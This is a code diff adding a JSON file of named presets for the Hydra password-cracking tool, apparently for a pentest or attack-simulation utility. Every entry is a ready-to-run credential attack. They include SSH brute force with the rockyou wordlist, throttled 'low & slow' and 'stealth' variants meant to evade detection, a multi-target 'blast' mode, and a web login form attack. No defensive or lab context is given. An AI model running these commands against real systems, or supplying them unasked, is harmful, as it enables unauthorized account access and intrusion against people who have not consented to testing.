@@ -1,0 +1,8 @@
+{
+  "Hydra - Low & Slow SSH": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 1 -w 30 ssh://192.168.1.1",
+  "Hydra - Single Try Stealth": "hydra -l admin -p Summer2024! -t 1 ssh://192.168.1.1",
+  "Hydra - Full Brute Force": "hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt -t 16 ssh://192.168.1.1",
+  "Hydra - Multi-Target Blast": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 16 -M targets.txt ssh",
+  "Hydra - Brute Force": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
+  "Hydra - Targeted Web Login": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""
+}
